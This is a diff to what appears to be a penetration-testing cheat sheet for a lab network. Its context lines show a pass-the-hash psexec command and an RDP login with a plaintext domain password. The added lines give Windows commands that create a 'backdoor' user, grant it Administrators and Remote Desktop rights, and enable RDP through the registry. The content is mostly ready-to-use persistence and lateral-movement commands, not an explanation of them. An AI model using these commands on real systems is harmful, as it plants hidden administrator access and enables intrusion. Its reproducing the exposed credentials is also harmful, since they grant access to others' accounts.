@@ -16,4 +16,15 @@ python3 ./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF8
 
 rdesktop -d xor.com -u daisy -p XorPasswordIsDead17 10.11.1.122 -r clipboard:CLIPBOARD
 
+### Add user
+`net user backdoor backdoor123 /add`
+
+### Add user to Administrator group
+`net localgroup Administrators backdoor /add`
+
+### Add user to remotedesktop
+`net localgroup "Remote Desktop Users" backdoor /add`
+
+### Enable RDP
+`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`
 
